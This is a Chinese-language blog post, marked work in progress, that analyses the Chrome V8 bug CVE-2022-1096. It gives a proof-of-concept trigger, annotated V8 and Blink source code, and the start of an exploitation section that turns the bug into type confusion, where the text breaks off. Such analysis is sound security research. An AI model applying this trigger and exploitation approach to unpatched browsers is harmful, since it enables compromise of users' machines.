<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    
    <title>CVE-2022-1096 (WIP) | My New Hugo Site</title>
    <meta name="viewport" content="width=device-width,minimum-scale=1">
    <meta name="description" content="CVE-2022-1096 是 CVE-2021-30551 的变种。
准备环境
阅读 Google P0 的分析报告 得知修复的版本是 99.0.4844.84，搜到对应的发布记录，依照时间找到上一个版本是 99.0.4844.82，使用 获取旧版本的 Chrome 中的方法构建出对应的二进制文件。
分析成因
将 POC 代码稍加修改，方便调试：
style = document.createElement(&#39;p&#39;).style;
alert(1);
style.prop = { toString: () =&gt; {
  style.prop = 1;
}};
alert(2)
根据之前调试 CVE-2021-30551 积累的经验，漏洞是在 v8/src/objects/objects.cc：Object::SetProperty 函数执行过程中触发的，在 alert(1) 弹出后，在 Object::SetProperty 函数开头下断点，然后点掉弹窗，让程序断下后开始调试。
Maybe&lt;bool&gt; Object::SetProperty(LookupIterator* it, Handle&lt;Object&gt; value,
                                StoreOrigin store_origin,
                                Maybe&lt;ShouldThrow&gt; should_throw) {
  if (it-&gt;IsFound()) {
    bool found = true;
    Maybe&lt;bool&gt; result =
        SetPropertyInternal(it, value, should_throw, store_origin, &amp;found);
    if (found) return result;
  }

  if (!CheckContextualStoreToJSGlobalObject(it, should_throw)) {
    return Nothing&lt;bool&gt;();
  }
  return AddDataProperty(it, value, NONE, should_throw, store_origin);
}
大体和 CVE-2021-30551 的流程一致，虽然 style 对象还没有名为 prop 的属性，但是由于 style 是设置了 INTERCEPTOR 的 DOM 对象， 属性的查找结果是找到了 INTERCEPTOR，it-&gt;IsFound() 条件满足，程序走到 SetPropertyInternal 中，经过多层调用，最终到达 V8CSSStyleDeclaration::NamedPropertySetterCallback 函调函数。">
    <meta name="generator" content="Hugo 0.139.2">
    
    
    
      <meta name="robots" content="noindex, nofollow">
    
    

    
<link rel="stylesheet" href="/ananke/css/main.min.css" >



    

    
      

    

    

    
      <link rel="canonical" href="http://localhost:1313/posts/2022-11-26-cve-2022-1096/">
    

    <meta property="og:url" content="http://localhost:1313/posts/2022-11-26-cve-2022-1096/">
  <meta property="og:site_name" content="My New Hugo Site">
  <meta property="og:title" content="CVE-2022-1096 (WIP)">
  <meta property="og:description" content="CVE-2022-1096 是 CVE-2021-30551 的变种。
准备环境 阅读 Google P0 的分析报告 得知修复的版本是 99.0.4844.84，搜到对应的发布记录，依照时间找到上一个版本是 99.0.4844.82，使用 获取旧版本的 Chrome 中的方法构建出对应的二进制文件。
分析成因 将 POC 代码稍加修改，方便调试：
style = document.createElement(&#39;p&#39;).style; alert(1); style.prop = { toString: () =&gt; { style.prop = 1; }}; alert(2) 根据之前调试 CVE-2021-30551 积累的经验，漏洞是在 v8/src/objects/objects.cc：Object::SetProperty 函数执行过程中触发的，在 alert(1) 弹出后，在 Object::SetProperty 函数开头下断点，然后点掉弹窗，让程序断下后开始调试。
Maybe&lt;bool&gt; Object::SetProperty(LookupIterator* it, Handle&lt;Object&gt; value, StoreOrigin store_origin, Maybe&lt;ShouldThrow&gt; should_throw) { if (it-&gt;IsFound()) { bool found = true; Maybe&lt;bool&gt; result = SetPropertyInternal(it, value, should_throw, store_origin, &amp;found); if (found) return result; } if (!CheckContextualStoreToJSGlobalObject(it, should_throw)) { return Nothing&lt;bool&gt;(); } return AddDataProperty(it, value, NONE, should_throw, store_origin); } 大体和 CVE-2021-30551 的流程一致，虽然 style 对象还没有名为 prop 的属性，但是由于 style 是设置了 INTERCEPTOR 的 DOM 对象， 属性的查找结果是找到了 INTERCEPTOR，it-&gt;IsFound() 条件满足，程序走到 SetPropertyInternal 中，经过多层调用，最终到达 V8CSSStyleDeclaration::NamedPropertySetterCallback 函调函数。">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">

  <meta itemprop="name" content="CVE-2022-1096 (WIP)">
  <meta itemprop="description" content="CVE-2022-1096 是 CVE-2021-30551 的变种。
准备环境 阅读 Google P0 的分析报告 得知修复的版本是 99.0.4844.84，搜到对应的发布记录，依照时间找到上一个版本是 99.0.4844.82，使用 获取旧版本的 Chrome 中的方法构建出对应的二进制文件。
分析成因 将 POC 代码稍加修改，方便调试：
style = document.createElement(&#39;p&#39;).style; alert(1); style.prop = { toString: () =&gt; { style.prop = 1; }}; alert(2) 根据之前调试 CVE-2021-30551 积累的经验，漏洞是在 v8/src/objects/objects.cc：Object::SetProperty 函数执行过程中触发的，在 alert(1) 弹出后，在 Object::SetProperty 函数开头下断点，然后点掉弹窗，让程序断下后开始调试。
Maybe&lt;bool&gt; Object::SetProperty(LookupIterator* it, Handle&lt;Object&gt; value, StoreOrigin store_origin, Maybe&lt;ShouldThrow&gt; should_throw) { if (it-&gt;IsFound()) { bool found = true; Maybe&lt;bool&gt; result = SetPropertyInternal(it, value, should_throw, store_origin, &amp;found); if (found) return result; } if (!CheckContextualStoreToJSGlobalObject(it, should_throw)) { return Nothing&lt;bool&gt;(); } return AddDataProperty(it, value, NONE, should_throw, store_origin); } 大体和 CVE-2021-30551 的流程一致，虽然 style 对象还没有名为 prop 的属性，但是由于 style 是设置了 INTERCEPTOR 的 DOM 对象， 属性的查找结果是找到了 INTERCEPTOR，it-&gt;IsFound() 条件满足，程序走到 SetPropertyInternal 中，经过多层调用，最终到达 V8CSSStyleDeclaration::NamedPropertySetterCallback 函调函数。">
  <meta itemprop="wordCount" content="2026">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="CVE-2022-1096 (WIP)">
  <meta name="twitter:description" content="CVE-2022-1096 是 CVE-2021-30551 的变种。
准备环境 阅读 Google P0 的分析报告 得知修复的版本是 99.0.4844.84，搜到对应的发布记录，依照时间找到上一个版本是 99.0.4844.82，使用 获取旧版本的 Chrome 中的方法构建出对应的二进制文件。
分析成因 将 POC 代码稍加修改，方便调试：
style = document.createElement(&#39;p&#39;).style; alert(1); style.prop = { toString: () =&gt; { style.prop = 1; }}; alert(2) 根据之前调试 CVE-2021-30551 积累的经验，漏洞是在 v8/src/objects/objects.cc：Object::SetProperty 函数执行过程中触发的，在 alert(1) 弹出后，在 Object::SetProperty 函数开头下断点，然后点掉弹窗，让程序断下后开始调试。
Maybe&lt;bool&gt; Object::SetProperty(LookupIterator* it, Handle&lt;Object&gt; value, StoreOrigin store_origin, Maybe&lt;ShouldThrow&gt; should_throw) { if (it-&gt;IsFound()) { bool found = true; Maybe&lt;bool&gt; result = SetPropertyInternal(it, value, should_throw, store_origin, &amp;found); if (found) return result; } if (!CheckContextualStoreToJSGlobalObject(it, should_throw)) { return Nothing&lt;bool&gt;(); } return AddDataProperty(it, value, NONE, should_throw, store_origin); } 大体和 CVE-2021-30551 的流程一致，虽然 style 对象还没有名为 prop 的属性，但是由于 style 是设置了 INTERCEPTOR 的 DOM 对象， 属性的查找结果是找到了 INTERCEPTOR，it-&gt;IsFound() 条件满足，程序走到 SetPropertyInternal 中，经过多层调用，最终到达 V8CSSStyleDeclaration::NamedPropertySetterCallback 函调函数。">

	
  </head><body class="ma0 avenir bg-near-white development">

    
   
  

  <header>
    <div class="bg-black">
      <nav class="pv3 ph3 ph4-ns" role="navigation">
  <div class="flex-l justify-between items-center center">
    <a href="/" class="f3 fw2 hover-white no-underline white-90 dib">
      
        My New Hugo Site
      
    </a>
    <div class="flex-l items-center">
      

      
      <div class="ananke-socials"></div>

    </div>
  </div>
</nav>

    </div>
  </header>



    <main class="pb7" role="main">
      
  
  <article class="flex-l flex-wrap justify-between mw8 center ph3">
    <header class="mt4 w-100">
      <aside class="instapaper_ignoref b helvetica tracked ttu">
          
        Posts
      </aside><div id="sharing" class="mt3 ananke-socials"></div>
<h1 class="f1 athelas mt3 mb1">CVE-2022-1096 (WIP)</h1>
      
      
      

      
      
    </header>
    <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l w-two-thirds-l"><p>CVE-2022-1096 是 CVE-2021-30551 的变种。</p>
<h2 id="准备环境">准备环境</h2>
<p>阅读 <a href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-1096.html">Google P0 的分析报告</a> 得知修复的版本是 99.0.4844.84，搜到对应的<a href="https://chromereleases.googleblog.com/2022/03/stable-channel-update-for-desktop_25.html">发布记录</a>，依照时间找到上一个版本是 <a href="https://chromereleases.googleblog.com/2022/03/stable-channel-update-for-desktop_20.html">99.0.4844.82</a>，使用 <a href="2022-05-31-get-old-version-chrome-binary.md">获取旧版本的 Chrome</a> 中的方法构建出对应的二进制文件。</p>
<h2 id="分析成因">分析成因</h2>
<p>将 POC 代码稍加修改，方便调试：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">style</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;p&#39;</span>).<span style="color:#a6e22e">style</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">prop</span> <span style="color:#f92672">=</span> { <span style="color:#a6e22e">toString</span><span style="color:#f92672">:</span> () =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">prop</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}};
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">2</span>)
</span></span></code></pre></div><p>根据之前调试 CVE-2021-30551 积累的经验，漏洞是在 v8/src/objects/objects.cc：<code>Object::SetProperty</code> 函数执行过程中触发的，在 alert(1) 弹出后，在 Object::SetProperty 函数开头下断点，然后点掉弹窗，让程序断下后开始调试。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>Maybe<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">bool</span><span style="color:#f92672">&gt;</span> Object<span style="color:#f92672">::</span>SetProperty(LookupIterator<span style="color:#f92672">*</span> it, Handle<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> value,
</span></span><span style="display:flex;"><span>                                StoreOrigin store_origin,
</span></span><span style="display:flex;"><span>                                Maybe<span style="color:#f92672">&lt;</span>ShouldThrow<span style="color:#f92672">&gt;</span> should_throw) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (it<span style="color:#f92672">-&gt;</span>IsFound()) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">bool</span> found <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>    Maybe<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">bool</span><span style="color:#f92672">&gt;</span> result <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>        SetPropertyInternal(it, value, should_throw, store_origin, <span style="color:#f92672">&amp;</span>found);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (found) <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>CheckContextualStoreToJSGlobalObject(it, should_throw)) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> Nothing<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">bool</span><span style="color:#f92672">&gt;</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">AddDataProperty</span>(it, value, NONE, should_throw, store_origin);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>大体和 CVE-2021-30551 的流程一致，虽然 style 对象还没有名为 prop 的属性，但是由于 style 是设置了 INTERCEPTOR 的 DOM 对象， 属性的查找结果是找到了 INTERCEPTOR，it-&gt;IsFound() 条件满足，程序走到 SetPropertyInternal 中，经过多层调用，最终到达 V8CSSStyleDeclaration::NamedPropertySetterCallback 函调函数。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> V8CSSStyleDeclaration<span style="color:#f92672">::</span>NamedPropertySetterCallback(
</span></span><span style="display:flex;"><span>    v8<span style="color:#f92672">::</span>Local<span style="color:#f92672">&lt;</span>v8<span style="color:#f92672">::</span>Name<span style="color:#f92672">&gt;</span> v8_property_name,
</span></span><span style="display:flex;"><span>    v8<span style="color:#f92672">::</span>Local<span style="color:#f92672">&lt;</span>v8<span style="color:#f92672">::</span>Value<span style="color:#f92672">&gt;</span> v8_property_value,
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> v8<span style="color:#f92672">::</span>PropertyCallbackInfo<span style="color:#f92672">&lt;</span>v8<span style="color:#f92672">::</span>Value<span style="color:#f92672">&gt;&amp;</span> info) {
</span></span><span style="display:flex;"><span>  RUNTIME_CALL_TIMER_SCOPE_DISABLED_BY_DEFAULT(
</span></span><span style="display:flex;"><span>      info.GetIsolate(), <span style="color:#e6db74">&#34;Blink_CSSStyleDeclaration_NamedPropertySetter&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 3.9.2. [[Set]]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// https://webidl.spec.whatwg.org/#legacy-platform-object-set
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// step 1. If O and Receiver are the same object, then:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (info.Holder() <span style="color:#f92672">==</span> info.This()) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// step 1.2.1. Invoke the named property setter with P and V.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    v8<span style="color:#f92672">::</span>Isolate<span style="color:#f92672">*</span> isolate <span style="color:#f92672">=</span> info.GetIsolate();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> ExceptionState<span style="color:#f92672">::</span>ContextType exception_state_context_type <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>        ExceptionContext<span style="color:#f92672">::</span>Context<span style="color:#f92672">::</span>kNamedPropertySet;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> <span style="color:#66d9ef">const</span> class_like_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CSSStyleDeclaration&#34;</span>;
</span></span><span style="display:flex;"><span>    ExceptionState <span style="color:#a6e22e">exception_state</span>(isolate, exception_state_context_type,
</span></span><span style="display:flex;"><span>                                   class_like_name);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// [CEReactions]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    CEReactionsScope ce_reactions_scope;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    v8<span style="color:#f92672">::</span>Local<span style="color:#f92672">&lt;</span>v8<span style="color:#f92672">::</span>Object<span style="color:#f92672">&gt;</span> v8_receiver <span style="color:#f92672">=</span> info.Holder();
</span></span><span style="display:flex;"><span>    CSSStyleDeclaration<span style="color:#f92672">*</span> blink_receiver <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>        V8CSSStyleDeclaration<span style="color:#f92672">::</span>ToWrappableUnsafe(v8_receiver);
</span></span><span style="display:flex;"><span>    v8<span style="color:#f92672">::</span>Local<span style="color:#f92672">&lt;</span>v8<span style="color:#f92672">::</span>Context<span style="color:#f92672">&gt;</span> receiver_context <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>        v8_receiver<span style="color:#f92672">-&gt;</span>GetCreationContextChecked();
</span></span><span style="display:flex;"><span>    ScriptState<span style="color:#f92672">*</span> receiver_script_state <span style="color:#f92672">=</span> ScriptState<span style="color:#f92672">::</span>From(receiver_context);
</span></span><span style="display:flex;"><span>    ScriptState<span style="color:#f92672">*</span> script_state <span style="color:#f92672">=</span> receiver_script_state;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> AtomicString<span style="color:#f92672">&amp;</span> blink_property_name <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>        ToCoreAtomicString(v8_property_name.As<span style="color:#f92672">&lt;</span>v8<span style="color:#f92672">::</span>String<span style="color:#f92672">&gt;</span>());
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 这里会把值转换成字符串，触发其 toString 方法的回调
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">auto</span><span style="color:#f92672">&amp;&amp;</span> blink_property_value <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>        NativeValueTraits<span style="color:#f92672">&lt;</span>IDLStringTreatNullAsEmptyString<span style="color:#f92672">&gt;::</span>ArgumentValue(
</span></span><span style="display:flex;"><span>            isolate, <span style="color:#ae81ff">1</span>, v8_property_value, exception_state);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (UNLIKELY(exception_state.HadException())) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">auto</span><span style="color:#f92672">&amp;&amp;</span> return_value <span style="color:#f92672">=</span> blink_receiver<span style="color:#f92672">-&gt;</span>AnonymousNamedSetter(
</span></span><span style="display:flex;"><span>        script_state, blink_property_name, blink_property_value);
</span></span><span style="display:flex;"><span>    bindings<span style="color:#f92672">::</span>V8SetReturnValue(info, return_value);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// CSSStyleDeclaration is abusing named properties.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Do not intercept if the property is not found.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Do not intercept.  Fallback to OrdinarySetWithOwnDescriptor.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span></code></pre></div><p>在 Interceptor 回调中有一个把属性值转换成字符串的操作，如果值是一个 object 的话，这里会调用它的 toString 方法，而 toString 方法里会再次设置 prop 属性，这次设置的值为 1，设置完成后控制流最终返回到外层的值设置中，乍看和 CVE-2021-30551 好像没什么区别，为什么 CVE-2021-30551 的补丁没有解决这个问题呢？ 仔细查看修补的地方发现，由于 CVE-2021-30551 漏洞触发需要将 DOM 对象 HTMLEmbed 作为普通对象的原型，所以其补丁代码放到了针对原型的属性设置代码路径上，并不能覆盖直接给 DOM 对象设置属性的情况。</p>
<hr>
<p>⚠️ 提示：由于 prop 属性并不是这个 Interceptor 期望处理的属性，AnonymousNamedSetter 的返回值为  <code>NamedPropertySetterResult::kDidNotIntercept</code> ，代表Interceptor 不处理此属性设置操作。 结果就是 Interceptor 在这个流程里实际只起了调用 toString 回调函数的作用，不影响实际赋值给 prop 属性的值。</p>
<hr>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>Maybe<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">bool</span><span style="color:#f92672">&gt;</span> Object<span style="color:#f92672">::</span>SetPropertyInternal(LookupIterator<span style="color:#f92672">*</span> it,
</span></span><span style="display:flex;"><span>                                        Handle<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> value,
</span></span><span style="display:flex;"><span>                                        Maybe<span style="color:#f92672">&lt;</span>ShouldThrow<span style="color:#f92672">&gt;</span> should_throw,
</span></span><span style="display:flex;"><span>                                        StoreOrigin store_origin, <span style="color:#66d9ef">bool</span><span style="color:#f92672">*</span> found) {
</span></span><span style="display:flex;"><span> ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> (it<span style="color:#f92672">-&gt;</span>state()) {
</span></span><span style="display:flex;"><span>      ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> LookupIterator<span style="color:#f92672">::</span>INTERCEPTOR: {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (it<span style="color:#f92672">-&gt;</span>HolderIsReceiverOrHiddenPrototype()) {
</span></span><span style="display:flex;"><span>		    <span style="color:#75715e">/// CVE-2022-1096 的控制流会走这里
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          Maybe<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">bool</span><span style="color:#f92672">&gt;</span> result <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>              JSObject<span style="color:#f92672">::</span>SetPropertyWithInterceptor(it, should_throw, value);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (result.IsNothing() <span style="color:#f92672">||</span> result.FromJust()) <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>          Maybe<span style="color:#f92672">&lt;</span>PropertyAttributes<span style="color:#f92672">&gt;</span> maybe_attributes <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>              JSObject<span style="color:#f92672">::</span>GetPropertyAttributesWithInterceptor(it);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (maybe_attributes.IsNothing()) <span style="color:#66d9ef">return</span> Nothing<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">bool</span><span style="color:#f92672">&gt;</span>();
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ((maybe_attributes.FromJust() <span style="color:#f92672">&amp;</span> READ_ONLY) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">WriteToReadOnlyProperty</span>(it, value, should_throw);
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#75715e">// &gt;&gt; CVE-2021-30551 的修补位置
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          <span style="color:#75715e">// At this point we might have called interceptor&#39;s query or getter
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          <span style="color:#75715e">// callback. Assuming that the callbacks have side effects, we use
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          <span style="color:#75715e">// Object::SetSuperProperty() which works properly regardless on
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          <span style="color:#75715e">// whether the property was present on the receiver or not when
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          <span style="color:#75715e">// storing to the receiver.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          <span style="color:#66d9ef">if</span> (maybe_attributes.FromJust() <span style="color:#f92672">==</span> ABSENT) {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Proceed lookup from the next state.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            it<span style="color:#f92672">-&gt;</span>Next();
</span></span><span style="display:flex;"><span>          } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Finish lookup in order to make Object::SetSuperProperty() store
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">// property to the receiver.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            it<span style="color:#f92672">-&gt;</span>NotFound();
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> Object<span style="color:#f92672">::</span>SetSuperProperty(it, value, store_origin,
</span></span><span style="display:flex;"><span>                                          should_throw);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>	  ...
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    it<span style="color:#f92672">-&gt;</span>Next();
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (it<span style="color:#f92672">-&gt;</span>IsFound());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>found <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> Nothing<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">bool</span><span style="color:#f92672">&gt;</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="实现利用">实现利用</h2>
<p>距离我实现 CVE-2021-30551 的利用已经过去一段时间了，一些很重要的细节我都已经忘记了，这次就重新实现下漏洞的利用过程，加深印象。</p>
<h3 id="类型混淆">类型混淆</h3>
<p>利用这个漏洞要先将漏洞转换成类型混淆，按照 CVE-2021-30551 的利用思路，通过触发两次漏洞，创建出两个有微妙区别的对象，然后再配合上 JIT 编译生成的代码，就可以把这个漏洞转换成类型混淆。</p>
<p>先触发一次漏洞得到一个具有两个 prop 属性的对象 s1，代码如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">s1</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;p&#39;</span>).<span style="color:#a6e22e">style</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">v1</span> <span style="color:#f92672">=</span> { <span style="color:#a6e22e">toString</span><span style="color:#f92672">:</span> () =&gt; {<span style="color:#a6e22e">s1</span>.<span style="color:#a6e22e">prop</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>} };
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s1</span>.<span style="color:#a6e22e">prop</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">v1</span>;
</span></span></code></pre></div><p>之后再一次触发漏洞, 创建一个新对象 s2，不过这次漏洞触发的时候，我们希望能在设置第二个 prop 属性时，在控制流走到 LookupIterator::ApplyTransitionToDataProperty 函数时 <code>simple_transition</code> 条件为 <code>false</code>，这样控制流会走到 <code>ReloadPropertyInformation</code> 函数中，重新在 从对象中搜索 prop 属性的位置存储到 state_ 中，搜索算法是从属性描述符的数组的开头线性搜索，这样搜到的结果就是第一个 prop 属性的描述符，而不是刚刚添加的第二个 prop。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">/// 添加属性的关键函数
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Maybe<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">bool</span><span style="color:#f92672">&gt;</span> Object<span style="color:#f92672">::</span>AddDataProperty(LookupIterator<span style="color:#f92672">*</span> it, Handle<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> value,
</span></span><span style="display:flex;"><span>                                    PropertyAttributes attributes,
</span></span><span style="display:flex;"><span>                                    Maybe<span style="color:#f92672">&lt;</span>ShouldThrow<span style="color:#f92672">&gt;</span> should_throw,
</span></span><span style="display:flex;"><span>                                    StoreOrigin store_origin) {
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (it<span style="color:#f92672">-&gt;</span>IsElement(<span style="color:#f92672">*</span>receiver)) {
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/// &lt;&lt;&lt; 这里开始是添加属性的关键点
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    it<span style="color:#f92672">-&gt;</span>UpdateProtector();
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Migrate to the most up-to-date map that will be able to store |value|
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// under it-&gt;name() with |attributes|.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">/// &lt;&lt;&lt; 这里先准备一个存储了新属性描述符的新 map
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    it<span style="color:#f92672">-&gt;</span>PrepareTransitionToDataProperty(receiver, value, attributes,
</span></span><span style="display:flex;"><span>                                        store_origin);
</span></span><span style="display:flex;"><span>    DCHECK_EQ(LookupIterator<span style="color:#f92672">::</span>TRANSITION, it<span style="color:#f92672">-&gt;</span>state());
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/// &lt;&lt;&lt; 将新的 map 应用到 receiver 对象
